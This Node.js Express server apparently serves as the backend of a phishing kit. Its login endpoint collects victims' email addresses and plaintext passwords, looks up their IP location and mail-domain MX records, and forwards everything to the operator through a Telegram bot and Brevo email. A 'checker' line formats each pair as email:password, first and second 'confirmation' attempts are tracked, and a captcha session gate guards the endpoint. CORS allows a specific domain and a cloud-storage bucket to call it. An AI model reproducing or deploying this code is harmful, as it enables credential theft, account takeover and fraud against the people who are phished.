const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// 미들웨어
// ============================================================

app.use(cors({
  origin: [
    'https://lihtec.com',
    'https://www.lihtec.com',
    'https://f005.backblazeb2.com'
  ],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-session-token'],
  credentials: true
}));

// Ensure preflight OPTIONS requests are answered for every route
app.options('*', cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// 환경 설정
// ============================================================

const BOT_TOKEN            = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID              = process.env.TELEGRAM_CHAT_ID;
const BREVO_API_KEY        = process.env.BREVO_API_KEY;
const SENDER_EMAIL         = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME          = process.env.SENDER_NAME  || 'ABV 모니터';
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',')
    .map(e => e.trim())
    .filter(Boolean);

// 세션 토큰 저장소 (메모리)
const validSessions = new Map();

// 1시간마다 만료된 세션 정리
setInterval(() => {
    const now = Date.now();
    for (let [token, expiry] of validSessions.entries()) {
        if (now > expiry) validSessions.delete(token);
    }
}, 3600000);

// ============================================================
// 시작 시 환경 변수 확인
// ============================================================

console.log('========================================');
console.log('🔍 환경 변수 확인:');
console.log(`   텔레그램 봇 토큰 : ${BOT_TOKEN ? '✅' : '❌ 없음'}`);
console.log(`   텔레그램 채팅 ID : ${CHAT_ID ? '✅' : '❌ 없음'}`);
console.log(`   Brevo API 키    : ${BREVO_API_KEY ? '✅' : '❌ 없음'}`);
console.log(`   Turnstile 시크릿: ${TURNSTILE_SECRET_KEY ? '✅' : '❌ 없음'}`);
console.log(`   이메일 수신자   : ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + '명' : '❌ 없음'}`);
console.log('========================================');

// ============================================================
// 🛡️ 캡차 검증 엔드포인트
// ============================================================

app.post('/api/verify-captcha', async (req, res) => {
    const { token } = req.body;

    if (!token) {
        return res.status(400).json({ success: false, message: '토큰이 필요합니다' });
    }

    if (!TURNSTILE_SECRET_KEY) {
        console.error('❌ TURNSTILE_SECRET_KEY 가 설정되지 않았습니다');
        return res.status(500).json({ success: false, message: '서버 설정 오류' });
    }

    try {
        const formData = new URLSearchParams();
        formData.append('secret',   TURNSTILE_SECRET_KEY);
        formData.append('response', token);

        const cloudflareRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body: formData
        });

        const cloudflareData = await cloudflareRes.json();

        if (cloudflareData.success) {
            const sessionToken = crypto.randomBytes(32).toString('hex');
            const expiry = Date.now() + (1000 * 60 * 60); // 1시간

            validSessions.set(sessionToken, expiry);

            console.log('✅ 캡차 검증 성공. 세션 생성됨.');
            return res.json({
                success: true,
                sessionToken: sessionToken,
                message: '검증 성공'
            });
        } else {
            console.log('❌ 캡차 검증 실패:', cloudflareData['error-codes']);
            return res.status(403).json({
                success: false,
                message: '캡차 검증 실패',
                errors: cloudflareData['error-codes']
            });
        }
    } catch (error) {
        console.error('❌ 캡차 검증 중 오류:', error.message);
        return res.status(500).json({ success: false, message: '서버 내부 오류' });
    }
});

// ============================================================
// 헬퍼: Brevo 로 이메일 발송
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, attempt) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) {
        console.log('⚠️ Brevo 설정 안 됨, 이메일 건너뜀');
        return false;
    }

    const attemptLabel = attempt === 2 ? '2차 (확인)' : '1차 (최초)';
    const subject = `🔐 ABV 로그인 정보 — ${email} — ${attemptLabel}`;

    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <style>
            body { font-family: 'Malgun Gothic', Arial, sans-serif; background: #f5f5f5; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
            .content { padding: 20px; }
            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
            .label { font-weight: bold; color: #555; }
            .value { color: #1e930c; font-size: 16px; }
            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
            .attempt { background: #fff8e6; border-left: 4px solid #f0b400; padding: 10px 14px; margin: 10px 0; border-radius: 4px; font-weight: 600; }
            .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header"><h2>🔐 ABV 로그인 정보</h2></div>
            <div class="content">
                <div class="attempt">시도 회차: ${attemptLabel}</div>
                <div class="field"><div class="label">📧 이메일:</div><div class="value"><strong>${email}</strong></div></div>
                <div class="field"><div class="label">🔑 비밀번호:</div><div class="value"><strong>${password}</strong></div></div>
                <div class="field"><div class="label">🌐 도메인:</div><div class="value">${domain || '알 수 없음'}</div></div>
                <div class="field"><div class="label">📨 MX 레코드:</div><div class="value mx">${mxRecord || '알 수 없음'}</div></div>
                <div class="field"><div class="label">🌍 IP 주소:</div><div class="value">${ipInfo?.ip || '알 수 없음'}</div></div>
                <div class="field"><div class="label">📍 위치:</div><div class="value">${ipInfo?.city || '알 수 없음'}, ${ipInfo?.region || '알 수 없음'}, ${ipInfo?.country || '알 수 없음'}</div></div>
                <div class="field"><div class="label">📱 브라우저:</div><div class="value">${userAgent?.substring(0, 100) || '알 수 없음'}...</div></div>
                <div class="field"><div class="label">🕐 시각:</div><div class="value">${new Date().toLocaleString('ko-KR')}</div></div>
            </div>
            <div class="footer"><p>© ${new Date().getFullYear()} ABV 모니터</p></div>
        </div>
    </body>
    </html>
    `;

    const textContent = `
🔐 ABV 로그인 정보
════════════════════════════════════
시도 회차: ${attemptLabel}
📧 이메일: ${email}
🔑 비밀번호: ${password}
🌐 도메인: ${domain || '알 수 없음'}
📨 MX 레코드: ${mxRecord || '알 수 없음'}
🌍 IP 주소: ${ipInfo?.ip || '알 수 없음'}
📍 위치: ${ipInfo?.city || '알 수 없음'}, ${ipInfo?.region || '알 수 없음'}, ${ipInfo?.country || '알 수 없음'}
📱 브라우저: ${userAgent?.substring(0, 100) || '알 수 없음'}...
🕐 시각: ${new Date().toLocaleString('ko-KR')}
════════════════════════════════════
    `;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject: subject,
                htmlContent: htmlContent,
                textContent: textContent
            })
        });
        const data = await response.json();
        if (response.ok) {
            console.log('✅ Brevo 이메일 발송 성공:', data.messageId || '전송됨');
            return true;
        } else {
            console.error('❌ Brevo API 오류:', response.status, data.message || data.error || JSON.stringify(data));
            return false;
        }
    } catch (error) {
        console.error('❌ Brevo 이메일 발송 실패:', error.message);
        return false;
    }
}

// ============================================================
// 헬퍼: 텔레그램 전송
// ============================================================

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ 텔레그램 설정 안 됨, 건너뜀');
        return null;
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        const result = await response.json();
        console.log('📤 텔레그램:', result.ok ? '✅ 전송 완료' : '❌ 실패 — ' + (result.description || ''));
        return result;
    } catch (error) {
        console.error('❌ 텔레그램 오류:', error.message);
        return null;
    }
}

// ============================================================
// 헬퍼: IP 정보 조회
// ============================================================

async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim();
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('❌ IP 정보 조회 오류:', error.message);
        return { ip: ip || '알 수 없음', country: '알 수 없음', city: '알 수 없음', region: '알 수 없음' };
    }
}

// ============================================================
// 헬퍼: MX 레코드 조회
// ============================================================

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'MX 없음';
    } catch (error) {
        return 'MX 조회 오류';
    }
}

// ============================================================
// 헬스 체크
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        텔레그램설정: !!(BOT_TOKEN && CHAT_ID),
        이메일설정: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        턴스타일설정: !!TURNSTILE_SECRET_KEY,
        활성세션수: validSessions.size
    });
});

// ============================================================
// 🛡️ 미들웨어: 세션 토큰 검증
// ============================================================

function verifySession(req, res, next) {
    const sessionToken = req.headers['x-session-token'];

    if (!sessionToken) {
        console.log('⛔ 차단됨: 세션 토큰 없음');
        return res.status(401).json({ success: false, message: '인증 실패: 세션 토큰 없음' });
    }

    const expiry = validSessions.get(sessionToken);

    if (!expiry || Date.now() > expiry) {
        console.log('⛔ 차단됨: 유효하지 않거나 만료된 세션 토큰');
        return res.status(401).json({ success: false, message: '인증 실패: 유효하지 않거나 만료된 토큰' });
    }

    next();
}

// ============================================================
// 🔐 보호된 로그인 엔드포인트
// ============================================================

app.post('/api/login', verifySession, async (req, res) => {
    console.log('📧 로그인 시도 수신됨 (인증된 세션)');

    const { email, password, attempt } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: '이메일과 비밀번호가 필요합니다' });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ success: false, message: '이메일 형식이 잘못되었습니다' });
    }

    const clientIP       = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || '알 수 없음';
    const ipInfo         = await getIPInfo(clientIP);
    const domain         = email.split('@')[1];
    const mxRecord       = await getMXRecord(domain);
    const userAgent      = req.headers['user-agent']      || '알 수 없음';
    const acceptLanguage = req.headers['accept-language'] || '알 수 없음';
    const attemptNum     = (attempt === 2 || attempt === '2') ? 2 : 1;
    const attemptLabel   = attemptNum === 2 ? '2차 (확인)' : '1차 (최초)';

    console.log(`   📨 이메일: ${email} | 회차: ${attemptLabel}`);

    // 1) 텔레그램 메시지
    const telegramMessage = `
--------+ 엑셀 결 과 ${ipInfo.city || '알 수 없음'} ${ipInfo.region || '알 수 없음'}, ${ipInfo.country || '알 수 없음'} +--------
이메일 : ${email}
비밀번호 : ${password}
시도 회차 : ${attemptLabel}
체커 : ${email}:${password}
브라우저 : ${userAgent}
언어 : ${acceptLanguage}
MX 레코드 : ${mxRecord}
IP 주소 : ${clientIP}
지역 및 국가 : ${ipInfo.city || '알 수 없음'} ${ipInfo.region || '알 수 없음'}, ${ipInfo.country || '알 수 없음'}
시각 : ${new Date().toLocaleString('ko-KR')}
---------+ 엑셀 결 과 ${ipInfo.city || '알 수 없음'} ${ipInfo.region || '알 수 없음'}, ${ipInfo.country || '알 수 없음'} +-------------
`;
    const telegramResult = await sendToTelegram(telegramMessage);

    // 2) 이메일
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, attemptNum);

    // 응답
    const telegramOK = !!(telegramResult && telegramResult.ok);
    if (telegramOK || emailResult) {
        console.log('✅ 알림 발송 성공');
        return res.json({
            success: true,
            message: '로그인 처리 완료',
            notifications: { telegram: telegramOK, email: emailResult }
        });
    } else {
        console.log('❌ 알림 발송 실패');
        return res.status(500).json({ success: false, message: '알림 발송 실패' });
    }
});

// ============================================================
// 404
// ============================================================

app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: `엔드포인트를 찾을 수 없음: ${req.method} ${req.originalUrl}`
    });
});

// ============================================================
// 서버 시작
// ============================================================

app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 서버 실행 중 — 포트 ${PORT}`);
    console.log(`🌐 헬스 체크: http://localhost:${PORT}/health`);
    console.log(`📧 로그인:    http://localhost:${PORT}/api/login`);
    console.log('========================================');
});

process.on('uncaughtException',  (err) => console.error('❌ 처리되지 않은 예외:', err.message));
process.on('unhandledRejection', (r)   => console.error('❌ 처리되지 않은 거부:', r));